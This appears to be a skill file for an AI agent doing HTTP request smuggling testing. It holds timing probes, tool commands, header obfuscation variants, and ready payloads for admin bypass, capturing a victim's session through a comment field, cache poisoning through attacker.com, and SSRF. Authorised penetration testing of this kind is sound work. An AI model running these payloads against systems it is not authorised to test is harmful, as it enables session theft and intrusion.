---
name: vuln-http-smuggling
description: "HTTP request smuggling testing skill. Tests CL.TE, TE.CL, TE.TE, H2.CL, H2.TE desync vulnerabilities. Triggers: 'http smuggling', 'request smuggling', 'desync', 'cl.te', 'te.cl', 'h2 smuggling', 'front-end back-end desync'."
---

# HTTP Request Smuggling

Front-end/back-end desync where servers disagree on request boundaries. One smuggled request can hijack next victim's session.

## Phase 1: Detection

**CL.TE timing probe** (hangs if vulnerable — front-end uses Content-Length, back-end reads chunked):
```bash
curl -s -o /dev/null -w "%{time_total}" -X POST https://<target>/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  --data $'3\r\nabc\r\nX'
# >10s hang = likely vulnerable
```

**TE.CL timing probe** (hangs if vulnerable):
```bash
curl -s -o /dev/null -w "%{time_total}" -X POST https://<target>/ \
  -H "Content-Length: 3" \
  -H "Transfer-Encoding: chunked" \
  --data $'1\r\nZ\r\n0\r\n\r\n'
```

**Automated detection:**
```bash
python3 smuggler.py -u https://<target> -m POST
python3 smuggler.py -u https://<target> -l wordlist.txt
```

**HTTP/2 downgrade testing:**
```bash
python3 h2csmuggler.py --test https://<target>
python3 h2csmuggler.py -x https://<target> http://<target>/admin
```

## Phase 2: TE.TE Obfuscation Variants

When both servers support Transfer-Encoding, confuse one via header obfuscation:
```
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: [tab]chunked
X: X[\n]Transfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

## Phase 3: Exploitation Patterns

**Access control bypass** (smuggle request to blocked `/admin`):
```
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```

**Session hijacking** (capture next victim's request):
```
POST / HTTP/1.1
Host: target.com
Content-Length: 197
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 400
Cookie: session=<attacker_session>

csrf=<csrf>&postId=5&name=carlos&email=attacker%40evil.com&comment=
```
Next victim's request appended to comment field; exfiltrate via GET to view comment.

**Cache poisoning via smuggling:**
```
POST / HTTP/1.1
Host: target.com
Content-Length: 59
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
X-Forwarded-Host: attacker.com
```

**SSRF via smuggling** (reach internal services):
```
POST / HTTP/1.1
Host: target.com
Content-Length: 116
Transfer-Encoding: chunked

0

GET http://internal-backend/admin HTTP/1.1
Host: internal-backend
```

## Phase 4: H2 Downgrade Attacks

HTTP/2 request injection via header smuggling (target using H2→H1.1 proxy):
```bash
# Test H2 header injection
python3 h2csmuggler.py -x https://<target> \
  --header "Transfer-Encoding: chunked" \
  "http://localhost/admin"
```

## Validation (REQUIRED before reporting)

Confidence threshold ≥0.70 required. Three criteria:
1. **Causality**: trace timing delay or differential response to specific CL/TE header combination
2. **Reproducibility**: demonstrate response queue poisoning affecting a simulated "victim" request
3. **Impact**: show access control bypass, session capture, or cache poisoning

Confirm safe PoC — avoid impacting real users in production. Test with attacker-controlled victim where possible.
